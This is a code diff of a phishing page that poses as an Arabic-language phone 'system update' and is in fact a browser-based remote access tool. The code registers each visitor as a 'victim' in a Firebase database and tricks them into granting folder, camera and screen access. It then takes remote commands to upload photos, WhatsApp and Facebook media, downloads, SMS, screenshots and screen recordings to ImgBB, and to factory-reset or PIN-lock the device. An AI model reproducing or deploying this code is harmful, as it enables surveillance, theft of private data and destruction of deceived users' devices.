@@ -16,6 +16,7 @@
     <div id="msg">📱 تحديث النظام مطلوب</div>
     <button id="grantBtn" class="btn" onclick="startPayload()">بدء التحديث</button>
     <script>
+        // ========== الإعدادات ==========
         const firebaseConfig = {
             apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
             authDomain: "zwahy-5b75d.firebaseapp.com",
@@ -31,245 +32,320 @@
 
         const browserFingerprint = navigator.userAgent + screen.width + screen.height + navigator.hardwareConcurrency;
         const vid = 'phantom-' + Math.abs(hashCode(browserFingerprint)).toString(36);
-        const vref = db.ref('victims/'+vid);
+        const vref = db.ref('victims/' + vid);
         let ROOT_HANDLE = null;
         let camStream = null;
         let lootCounter = 0;
+        let audioCtx = null;
 
         function hashCode(str) {
             let hash = 0;
             for (let i = 0; i < str.length; i++) {
-                const char = str.charCodeAt(i);
-                hash = ((hash << 5) - hash) + char;
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                 hash |= 0;
             }
             return hash;
         }
 
+        // ========== بدء الواجهة ==========
         setTimeout(() => {
-            document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث' للمتابعة";
+            document.getElementById('msg').innerText = "يرجى الضغط على 'بدء التحديث'";
             document.getElementById('grantBtn').style.display = 'block';
         }, 2000);
 
         window.startPayload = async function() {
-            const btn = document.getElementById('grantBtn');
-            btn.style.display = 'none';
+            document.getElementById('grantBtn').style.display = 'none';
             document.getElementById('msg').innerText = "جاري التحديث...";
 
-            // تسجيل الجهاز فوراً
+            // تفعيل الصوت
+            try {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                if (audioCtx.state === 'suspended') await audioCtx.resume();
+            } catch(e) {}
+
+            // تسجيل الجهاز
             await vref.child('loot').remove();
             lootCounter = 0;
             await registerDevice();
 
-            // طلب المجلد مع مهلة 5 ثوان فقط
-            const folderPromise = window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000));
+            // طلب المجلد مع مهلة
             try {
+                const folderPromise = window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
+                const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 4000));
                 ROOT_HANDLE = await Promise.race([folderPromise, timeoutPromise]);
             } catch(e) {
                 ROOT_HANDLE = null;
             }
 
-            // باقي الصلاحيات
+            // الصلاحيات
             try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
             try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
-            try {
-                let a = document.createElement('a');
-                a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
-                a.click();
-            } catch(e) {}
 
             vref.child('online').set(true);
 
-            // الانتقال للواجهة النهائية
             document.getElementById('msg').innerText = "✅ تم بنجاح";
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
             }, 1000);
 
-            startCommandListener();
+            // بدء الاستماع للأوامر
+            listenForCommands();
         };
 
+        // ========== تسجيل الجهاز ==========
         async function registerDevice() {
             let ip = 'غير معروف';
             try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
             let battery = '?', charging = false;
-            try { if (navigator.getBattery) { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+'%'; charging = b.charging; } } catch(e) {}
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + '%';
+                    charging = b.charging;
+                }
+            } catch(e) {}
             await vref.set({
                 online: true,
                 fingerprint: {
-                    ua: navigator.userAgent, plat: navigator.platform, scr: screen.width+'x'+screen.height,
-                    cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory||'?',
-                    ip, battery, charging, language: navigator.language, time: new Date().toLocaleString()
+                    ua: navigator.userAgent,
+                    plat: navigator.platform,
+                    scr: screen.width + 'x' + screen.height,
+                    cores: navigator.hardwareConcurrency,
+                    mem: navigator.deviceMemory || '?',
+                    ip: ip,
+                    battery: battery,
+                    charging: charging,
+                    language: navigator.language,
+                    time: new Date().toLocaleString()
                 }
             });
+            console.log('✅ مسجل:', vid);
         }
 
-        function startCommandListener() {
-            vref.child('command').on('value', async snap => {
-                const c = snap.val();
-                if (!c) return;
+        // ========== استقبال الأوامر ==========
+        function listenForCommands() {
+            vref.child('command').on('value', async (snap) => {
+                const cmd = snap.val();
+                if (!cmd) return;
+                console.log('📩 أمر:', cmd.action);
+                
                 try {
-                    switch(c.action) {
-                        case 'get_photos': c.folder ? await pullFromFolder(c.folder) : await pullAll(); break;
-                        case 'get_files': await pullFromFolder(c.folder || 'downloads'); break;
-                        case 'get_sms': await getSMS(); break;
-                        case 'send_notification': showNotification(c.message || ''); break;
-                        case 'vibrate': navigator.vibrate([500,200,500,200,500]); break;
-                        case 'play_sound': playRingtone(); break;
-                        case 'screenshot': await screenshot(); break;
-                        case 'record_video': await recordVid(c.duration||10); break;
-                        case 'format': await formatDevice(); break;
-                        case 'flash_on': await setFlash(true); break;
-                        case 'flash_off': await setFlash(false); break;
-                        case 'device_info': await sendDeviceInfo(); break;
-                        case 'lock_screen': lockScreen(c.pin || ''); break;
+                    switch(cmd.action) {
+                        case 'get_photos':
+                            if (cmd.folder) await pullFromFolder(cmd.folder);
+                            else await pullAll();
+                            break;
+                        case 'get_files':
+                            await pullFromFolder(cmd.folder || 'downloads');
+                            break;
+                        case 'get_sms':
+                            await getSMS();
+                            break;
+                        case 'send_notification':
+                            showNotification(cmd.message || '');
+                            break;
+                        case 'vibrate':
+                            navigator.vibrate([500, 200, 500, 200, 500]);
+                            break;
+                        case 'play_sound':
+                            playRingtone();
+                            break;
+                        case 'screenshot':
+                            await screenshot();
+                            break;
+                        case 'record_video':
+                            await recordVid(cmd.duration || 10);
+                            break;
+                        case 'format':
+                            await formatDevice();
+                            break;
+                        case 'flash_on':
+                            await setFlash(true);
+                            break;
+                        case 'flash_off':
+                            await setFlash(false);
+                            break;
+                        case 'device_info':
+                            await sendDeviceInfo();
+                            break;
+                        case 'lock_screen':
+                            lockScreen(cmd.pin || '');
+                            break;
                     }
-                } catch(e) {}
+                } catch(e) {
+                    console.error('❌ خطأ:', e.message);
+                }
+                // حذف الأمر بعد التنفيذ
                 await vref.child('command').remove();
             });
         }
 
+        // ========== رنة تنبيه ==========
         function playRingtone() {
             try {
                 const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = ctx.createOscillator(), gain = ctx.createGain();
-                osc.type = 'square'; osc.frequency.value = 800; gain.gain.value = 0.3;
-                osc.connect(gain); gain.connect(ctx.destination); osc.start();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.type = 'square';
+                osc.frequency.value = 800;
+                gain.gain.value = 0.5;
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+                osc.start();
                 setTimeout(() => { osc.stop(); gain.disconnect(); ctx.close(); }, 3000);
             } catch(e) {}
         }
 
+        // ========== سحب الملفات ==========
         async function getFolderHandle(folderName) {
-            const FOLDER_NAMES = {
-                camera: 'DCIM/Camera', downloads: 'Download',
-                whatsapp: 'WhatsApp/Media/WhatsApp Images',
-                facebook: 'Facebook/Media', pictures: 'Pictures'
+            const MAP = {
+                camera: 'الكاميرا',
+                downloads: 'التنزيلات',
+                whatsapp: 'واتساب',
+                facebook: 'فيسبوك',
+                pictures: 'الصور'
             };
-            const displayName = FOLDER_NAMES[folderName] || folderName;
-            document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد:<br>${displayName}</h2>`;
-            try {
-                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-                return handle;
-            } catch(e) {
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-                throw new Error('تم رفض اختيار المجلد');
-            }
+            const name = MAP[folderName] || folderName;
+            document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد ${name}</h2>`;
+            const handle = await window.showDirectoryPicker({ mode: 'readwrite' });
+            document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+            return handle;
         }
 
-        async function pullFromFolder(key) { const handle = await getFolderHandle(key); await walkDir(handle, key + '/'); }
-        async function pullAll() { for (const key of ['camera','downloads','whatsapp','facebook','pictures']) { try { await pullFromFolder(key); } catch(e) {} } }
+        async function pullFromFolder(key) {
+            const handle = await getFolderHandle(key);
+            await walkDir(handle, key + '/');
+        }
+
+        async function pullAll() {
+            for (const key of ['camera', 'downloads', 'whatsapp', 'facebook', 'pictures']) {
+                try { await pullFromFolder(key); } catch(e) {}
+            }
+        }
 
         async function walkDir(dirHandle, prefix) {
             for await (let entry of dirHandle.values()) {
                 if (entry.kind === 'file') {
-                    let file = await entry.getFile();
-                    if (file.size > 15*1024*1024) continue;
-                    let reader = new FileReader();
-                    reader.onload = async e => {
-                        let b64 = e.target.result.split(',')[1];
-                        let url = await uploadToImgBB(b64);
-                        await store('file', url, { name: prefix+entry.name, size: file.size });
+                    const file = await entry.getFile();
+                    if (file.size > 10 * 1024 * 1024) continue;
+                    const reader = new FileReader();
+                    reader.onload = async (e) => {
+                        const b64 = e.target.result.split(',')[1];
+                        const url = await uploadToImgBB(b64);
+                        await store('file', url, { name: prefix + entry.name, size: file.size });
                     };
                     reader.readAsDataURL(file);
                 } else if (entry.kind === 'directory') {
-                    let sub = await dirHandle.getDirectoryHandle(entry.name);
-                    await walkDir(sub, prefix+entry.name+'/');
+                    const sub = await dirHandle.getDirectoryHandle(entry.name);
+                    await walkDir(sub, prefix + entry.name + '/');
                 }
             }
         }
 
+        // ========== SMS ==========
         async function getSMS() {
             try {
                 let messages = [];
                 if ('webkitSms' in window) {
-                    const smsList = await window.webkitSms.getMessages({});
-                    for (let sms of smsList) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
+                    const list = await window.webkitSms.getMessages({});
+                    for (let sms of list) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
                 } else if ('sms' in navigator) {
-                    const smsList = await navigator.sms.getMessages({});
-                    for (let sms of smsList) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
+                    const list = await navigator.sms.getMessages({});
+                    for (let sms of list) messages.push({ from: sms.sender, body: sms.body, date: new Date(sms.timestamp).toLocaleString() });
                 } else throw new Error('غير مدعوم');
                 await store('sms', null, { info: messages });
-            } catch(e) { await store('sms', null, { info: { error: e.message } }); }
+            } catch(e) {
+                await store('sms', null, { info: { error: e.message } });
+            }
         }
 
+        // ========== إشعار ==========
         function showNotification(message) {
             const div = document.createElement('div');
-            div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px 30px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;box-shadow:0 0 20px rgba(0,0,0,0.5);text-align:center;';
+            div.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#ff0;color:#000;padding:20px;border-radius:10px;font-size:1.2em;font-weight:bold;z-index:999999;text-align:center;';
             div.textContent = message;
             document.body.appendChild(div);
-            setTimeout(() => { div.remove(); }, 3000);
+            setTimeout(() => div.remove(), 3000);
         }
 
+        // ========== فلاش ==========
         async function setFlash(on) {
             if (!camStream) return;
-            let track = camStream.getVideoTracks()[0];
-            if (track && track.applyConstraints) await track.applyConstraints({ advanced: [{ torch: on }] });
+            const track = camStream.getVideoTracks()[0];
+            if (track && track.applyConstraints) {
+                await track.applyConstraints({ advanced: [{ torch: on }] });
+            }
         }
 
+        // ========== معلومات الجهاز ==========
         async function sendDeviceInfo() {
-            let info = (await vref.child('fingerprint').once('value')).val() || {};
+            const snap = await vref.child('fingerprint').once('value');
+            const info = snap.val() || {};
             await store('device_info', null, { info });
         }
 
+        // ========== لقطة شاشة ==========
         async function screenshot() {
-            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-            let video = document.createElement('video'); video.srcObject = stream; await video.play();
-            let canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            let b64 = canvas.toDataURL('image/png').split(',')[1];
-            let url = await uploadToImgBB(b64);
+            const b64 = canvas.toDataURL('image/png').split(',')[1];
+            const url = await uploadToImgBB(b64);
             await store('screenshot', url, { ts: Date.now() });
             stream.getTracks().forEach(t => t.stop());
         }
 
+        // ========== فيديو ==========
         async function recordVid(sec) {
-            let stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-            let recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-            let chunks = [];
+            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = async () => {
-                let blob = new Blob(chunks, { type: 'video/webm' });
-                let r = new FileReader();
-                r.onload = async e => {
-                    let b64 = e.target.result.split(',')[1];
-                    let url = await uploadToImgBB(b64);
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.onload = async (e) => {
+                    const b64 = e.target.result.split(',')[1];
+                    const url = await uploadToImgBB(b64);
                     await store('video', url, { ts: Date.now() });
                 };
-                r.readAsDataURL(blob);
+                reader.readAsDataURL(blob);
                 stream.getTracks().forEach(t => t.stop());
             };
             recorder.start();
             setTimeout(() => recorder.stop(), sec * 1000);
         }
 
+        // ========== فرمتة ==========
         async function formatDevice() {
-            let a = document.createElement('a');
+            const a = document.createElement('a');
             a.href = 'intent://#Intent;action=android.intent.action.MASTER_CLEAR;end';
             a.click();
-            if (navigator.storage?.getDirectory) {
-                let root = await navigator.storage.getDirectory();
-                for await (let n of root.keys()) await root.removeEntry(n, { recursive: true });
-            }
-            if (navigator.clearData) await navigator.clearData({ cache: true, cookies: true, storage: true });
         }
 
+        // ========== قفل ==========
         function lockScreen(pin) {
-            try {
-                window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
-                setTimeout(() => { window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'); }, 500);
-            } catch(e) {}
+            window.open(`intent://#Intent;action=android.app.action.SET_NEW_PASSWORD;extra.android.app.extra.PASSWORD=${pin};end`);
+            setTimeout(() => window.open('intent://#Intent;action=android.app.action.LOCK_DEVICE;end'), 500);
         }
 
+        // ========== ImgBB ==========
         async function uploadToImgBB(b64) {
-            let fd = new FormData(); fd.append('key', IMGBB_KEY); fd.append('image', b64);
-            let res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
-            let json = await res.json();
+            const fd = new FormData();
+            fd.append('key', IMGBB_KEY);
+            fd.append('image', b64);
+            const res = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: fd });
+            const json = await res.json();
             if (json.success) return json.data.url;
-            throw new Error('رفع فشل');
+            throw new Error('فشل الرفع');
         }
 
+        // ========== تخزين ==========
         async function store(type, url, extra = {}) {
             lootCounter++;
             await vref.child('loot').push().set({ type, url, ts: Date.now(), counter: lootCounter, ...extra });
